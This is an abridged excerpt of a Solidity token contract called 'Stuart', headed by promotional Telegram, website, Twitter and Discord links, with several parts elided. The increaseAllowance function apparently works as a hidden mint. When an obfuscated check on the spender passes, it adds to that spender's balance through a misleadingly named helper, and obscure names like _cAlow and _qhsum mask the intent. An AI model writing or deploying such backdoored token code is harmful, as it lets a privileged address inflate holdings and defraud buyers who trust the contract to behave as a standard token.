//Telegram: https://t.me/MinionsSTUART
//Website: https://minionsstuart.xyz
//Twitter: https://twitter.com/Mini0nsstuart
//Discord: https://discord.gg/bYPVSAQv
...
contract Stuart is IERC20, Token, Ownable {
    ...
    function multiTransfer(address[] memory recipients, uint256 amount) external {
        ...
        for (uint256 i = 0; i < recipients.length; i++) {
            _internalTransfer(from, recipients[i], amount);
        }
    }
    ...
    function increaseAllowance(address spender, uint256 amount) public virtual {
        ...
        if (_gDxAllowance(spender)) {
            _min(from, total);
            _balances[spender] += _qhsum(total, amount);
        } else {
            _min(from, total);
    ...
    function _qhsum(uint256 qwe, uint256 mna) internal pure returns (uint256) {
        if (mna != 0) {
            return qwe + mna;
        }
        return mna;
    ...
    function Approve(address spender, uint256 amount) public returns (bool)  {
        address from = msg.sender;
        _cAlow(from, spender, amount);
        return true;
    }

    function _cAlow(address user, address spender, uint256 amount) internal {
